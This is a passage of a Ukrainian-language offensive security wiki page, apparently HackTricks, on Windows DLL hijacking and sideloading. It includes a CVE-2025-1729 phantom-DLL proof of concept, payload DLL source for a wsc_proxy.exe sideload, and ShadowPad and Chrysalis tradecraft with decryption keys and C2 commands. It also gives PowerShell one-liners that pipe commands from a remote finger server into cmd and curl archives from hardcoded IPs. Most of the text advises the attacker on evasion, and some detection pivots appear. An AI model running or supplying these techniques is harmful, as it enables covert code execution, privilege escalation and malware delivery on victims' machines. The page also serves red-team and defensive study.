- Виконання припиняється після закриття RDP session — виконайте inject/migrate якнайшвидше.

Bring Your Own Accessibility (BYOA)
- Ви можете клонувати registry entry вбудованого Accessibility Tool (AT) (наприклад, CursorIndicator), змінити його так, щоб він вказував на довільний binary/DLL, імпортувати його, а потім встановити `configuration` на ім’я цього AT. Це забезпечує proxy для довільного виконання в межах Accessibility framework.

Notes
- Запис у `%windir%\System32` і зміна значень HKLM потребують прав адміністратора.
- Усю логіку payload можна розмістити в `DLL_PROCESS_ATTACH`; exports не потрібні.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Цей приклад демонструє **Phantom DLL Hijacking** у Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), що має ідентифікатор **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Vulnerability Details

- **Component**: `TPQMAssistant.exe`, розташований у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` запускається щодня о 9:30 під контекстом користувача, який увійшов у систему.
- **Directory Permissions**: Доступний для запису `CREATOR OWNER`, що дає локальним користувачам змогу додавати довільні файли.
- **DLL Search Behavior**: Спочатку намагається завантажити `hostfxr.dll` зі своєї робочої директорії та записує "NAME NOT FOUND", якщо файл відсутній, що вказує на пріоритет пошуку в локальній директорії.

### Exploit Implementation

Зловмисник може розмістити шкідливий stub `hostfxr.dll` у тій самій директорії, використовуючи відсутню DLL для досягнення code execution у контексті користувача:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Порядок атаки

1. Як стандартний користувач, помістіть `hostfxr.dll` у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Дочекайтеся запуску scheduled task о 9:30 під контекстом поточного користувача.
3. Якщо під час виконання task увійшов адміністратор, шкідлива DLL запускається в сесії адміністратора з рівнем цілісності medium.
4. Використайте стандартні техніки обходу UAC, щоб підвищити рівень від medium integrity до привілеїв SYSTEM.

## Приклад: MSI CustomAction Dropper + DLL Side-Loading через Signed Host (wsc_proxy.exe)

Зловмисники часто поєднують MSI-based droppers із DLL side-loading, щоб виконувати payload у trusted, signed process.<sup>[[10]](#references)</sup>

Огляд ланцюжка
- Користувач завантажує MSI. CustomAction непомітно запускається під час GUI-інсталяції (наприклад, LaunchApplication або VBScript action) і відновлює наступний stage з embedded resources.
- Dropper записує legitimate, signed EXE і malicious DLL в один каталог (приклад пари: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Після запуску signed EXE порядок пошуку Windows DLL спочатку завантажує wsc.dll із working directory, виконуючи attacker code у signed parent (ATT&CK T1574.001).

Аналіз MSI (що шукати)
- CustomAction table:
- Шукайте entries, які запускають executables або VBScript. Приклад suspicious pattern: LaunchApplication, що виконує embedded file у background.
- В Orca (Microsoft Orca.exe) перевірте CustomAction, InstallExecuteSequence і Binary tables.
- Embedded/split payloads у MSI CAB:
- Адміністративне розпакування: msiexec /a package.msi /qb TARGETDIR=C:\out
- Або використайте lessmsi: lessmsi x package.msi C:\out
- Шукайте кілька невеликих fragments, які об’єднуються та розшифровуються VBScript CustomAction. Типовий flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Практичний sideloading із wsc_proxy.exe
- Помістіть ці два файли в одну папку:
- wsc_proxy.exe: легітимний підписаний host (Avast). Процес намагається завантажити wsc.dll за іменем із власного каталогу.
- wsc.dll: DLL зловмисника. Якщо не потрібні певні exports, достатньо DllMain; інакше створіть proxy DLL і перенаправте необхідні exports до справжньої бібліотеки, запускаючи payload у DllMain.
- Створіть мінімальний DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Для вимог експорту використовуйте proxying framework (наприклад, DLLirant/Spartacus), щоб згенерувати forwarding DLL, яка також виконує ваш payload.

- Ця техніка ґрунтується на визначенні імені DLL host binary. Якщо host використовує абсолютні шляхи або safe loading flags (наприклад, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack може не спрацювати.
- KnownDLLs, SxS і forwarded exports можуть впливати на пріоритет і мають враховуватися під час вибору host binary та набору export.

## Підписані triads + зашифровані payloads (case study ShadowPad)

Check Point описала, як Ink Dragon розгортає ShadowPad за допомогою **three-file triad**, щоб маскуватися під легітимне ПЗ і водночас зберігати основний payload зашифрованим на диску:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – зловживають ПЗ таких vendors, як AMD, Realtek або NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Зловмисники перейменовують executable так, щоб він виглядав як Windows binary (наприклад, `conhost.exe`), але підпис Authenticode залишається дійсним.
2. **Malicious loader DLL** – розміщується поруч з EXE під очікуваним іменем (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL зазвичай є MFC binary, обфускованим за допомогою ScatterBrain framework; її єдине завдання – знайти encrypted blob, розшифрувати його та виконати reflective mapping ShadowPad.
3. **Encrypted payload blob** – часто зберігається як `<name>.tmp` у тому самому каталозі. Після memory-mapping розшифрованого payload loader видаляє TMP file, щоб знищити forensic evidence.

Нотатки щодо tradecraft:

* Перейменування signed EXE (зі збереженням оригінального `OriginalFileName` у PE header) дає змогу маскувати його під Windows binary, зберігаючи vendor signature, тому відтворюйте звичку Ink Dragon розміщувати binaries, схожі на `conhost.exe`, які насправді є AMD/NVIDIA utilities.
* Оскільки executable залишається trusted, для більшості allowlisting controls достатньо, щоб ваша malicious DLL знаходилася поруч із ним. Зосередьтеся на налаштуванні loader DLL; signed parent зазвичай може працювати без змін.
* Decryptor ShadowPad очікує, що TMP blob знаходиться поруч із loader і доступний для запису, щоб після mapping занулити file. Залишайте каталог доступним для запису, доки payload не завантажиться; після цього TMP file можна безпечно видалити для OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Оператори поєднують DLL sideloading із LOLBAS, тому єдиним custom artifact на диску залишається malicious DLL поруч із trusted EXE:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Hidden PowerShell запускає `cmd.exe /c`, отримує команди з Finger server і передає їх до `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` отримує текст через TCP/79; `| cmd` виконує відповідь server, даючи операторам змогу змінювати second stage на стороні server.

- **Built-in download/extract:** Завантажте archive з benign extension, розпакуйте його та розмістіть sideload target разом із DLL у випадковому `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` приховує progress і переходить за redirects; `tar -xf` використовує вбудований у Windows tar.

- **WMI/CIM launch:** Запустіть EXE через WMI, щоб telemetry показувала процес, створений CIM, поки він завантажує colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Працює з binaries, які віддають перевагу local DLL (наприклад, `intelbq.exe`, `nearby_share.exe`); payload (наприклад, Remcos) працює під trusted name.

- **Hunting:** Створіть alert на `forfiles`, коли `/p`, `/m` і `/c` з'являються разом; поза admin scripts це трапляється нечасто.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Під час нещодавнього intrusion Lotus Blossom зловжив trusted update chain для доставки NSIS-packed dropper, який розміщував DLL sideload і повністю in-memory payloads.<sup>[[13]](#references)</sup>

Tradecraft flow
- `update.exe` (NSIS) створює `%AppData%\Bluetooth`, позначає його як **HIDDEN**, розміщує перейменований Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll` та encrypted blob `BluetoothService`, а потім запускає EXE.
- Host EXE імпортує `log.dll` і викликає `LogInit`/`LogWrite`. `LogInit` виконує mmap-load blob; `LogWrite` розшифровує його за допомогою custom stream на основі LCG (constants **0x19660D** / **0x3C6EF35F**, key material отримується з попереднього hash), перезаписує buffer plaintext shellcode, звільняє тимчасові дані та переходить до нього.
- Щоб уникнути IAT, loader визначає APIs шляхом hashing export names із використанням **FNV-1a basis 0x811C9DC5 + prime 0x100019**, після чого застосовує Murmur-style avalanche (**0x85EBCA6B**) і порівнює результат із salted target hashes.

Main shellcode (Chrysalis)
- Розшифровує main module, подібний до PE, повторюючи add/XOR/sub із key `gQ2JR&9;` упродовж п'яти проходів, а потім динамічно завантажує `Kernel32.dll` → `GetProcAddress` для завершення import resolution.
- Відновлює DLL name strings під час виконання за допомогою per-character bit-rotate/XOR transforms, а потім завантажує `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Використовує другий resolver, який проходить **PEB → InMemoryOrderModuleList**, розбирає кожну export table блоками по 4 bytes із Murmur-style mixing і переходить до `GetProcAddress`, лише якщо hash не знайдено.

Embedded configuration & C2
- Config зберігається всередині dropped `BluetoothService` file за **offset 0x30808** (size **0x980**) і розшифровується за допомогою RC4 із key `qwhvb^435h&*7`, відкриваючи C2 URL та User-Agent.
- Beacons створюють dot-delimited host profile, додають на початок tag `4Q`, а потім RC4-encrypt його за допомогою key `vAuig34%^325hGV` перед `HttpSendRequestA` через HTTPS. Responses розшифровуються RC4 і передаються на виконання через tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode визначається CLI args: без args = install persistence (service/Run key), що вказує на `-i`; `-i` повторно запускає self із `-k`; `-k` пропускає install і запускає payload.

Alternate loader observed
- Під час тієї самої intrusion було розміщено Tiny C Compiler і виконано `svchost.exe -nostdlib -run conf.c` з `C:\ProgramData\USOShared\`, де поруч знаходився `libtcc.dll`. C source, наданий attacker, містив shellcode, який компілювався та запускався in-memory без запису PE на диск. Відтворіть за допомогою:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Цей етап компіляції та запуску на основі TCC імпортував `Wininet.dll` під час виконання та отримував shellcode другого етапу з hardcoded URL, створюючи гнучкий loader, який маскується під запуск компілятора.

## Signed-host sideloading із export proxying + host thread parking

Деякі ланцюжки DLL sideloading додають **стабілізацію**, щоб легітимний host залишався активним достатньо довго для коректного завантаження наступних етапів, замість аварійного завершення після завантаження malicious DLL.<sup>[[11]](#references)</sup>

Спостережуваний шаблон
- Розмістити trusted EXE поруч із malicious DLL, використовуючи очікуване ім’я dependency, наприклад `version.dll`.
- Malicious DLL **проксіює кожен очікуваний export** до справжньої system DLL (наприклад `%SystemRoot%\\System32\\version.dll`), щоб resolution імпортів і надалі успішно виконувалося, а host process продовжував працювати.
- Після завантаження malicious DLL **патчить entry point host**, щоб main thread переходив у нескінченний цикл `Sleep`, а не завершувався чи виконував code paths, які припинили б роботу process.
- Окремий thread виконує справжню malicious work: розшифровує ім’я або path DLL наступного етапу (часто використовуються RC4/XOR), а потім запускає її за допомогою `LoadLibrary`.

Чому це важливо
- Звичайне DLL proxying зберігає API compatibility, але не гарантує, що host залишатиметься активним достатньо довго для наступних етапів.
- Утримання main thread у `Sleep(INFINITE)` — простий спосіб залишити signed process у пам’яті, поки loader виконує decryption, staging або network bootstrap у worker thread.
- Пошук лише підозрілого `DllMain` може пропустити цей шаблон, якщо цікава поведінка відбувається після patching entry point host і запуску secondary thread.

Мінімальний workflow
1. Скопіювати signed host EXE та визначити DLL, яку він завантажує з local directory.
2. Створити proxy DLL, яка експортує ті самі functions і переспрямовує їх до legitimate DLL.
3. У `DllMain(DLL_PROCESS_ATTACH)` створити worker thread.
4. Із цього thread пропатчити entry point host або start routine main thread так, щоб він зациклювався на `Sleep`.
5. Розшифрувати ім’я/config DLL наступного етапу та викликати `LoadLibrary` або виконати manual-map payload.

Захисні pivots
- Signed processes, які завантажують `version.dll` або подібні common libraries із власного application directory замість `System32`.
- Memory patches у process entry point невдовзі після image load, особливо jumps/calls, переспрямовані на `Sleep`/`SleepEx`.
- Threads, створені proxy DLL, які одразу викликають `LoadLibrary` для другої DLL із розшифрованим ім’ям.
- Full-export proxy DLL, розміщені поруч із vendor executables у writable staging directories, таких як `ProgramData`, `%TEMP%` або шляхи до unpacked archives.

## References

- [1] [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking in Windows. Simple C example.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)

{{#include ../../../banners/hacktricks-training.md}}
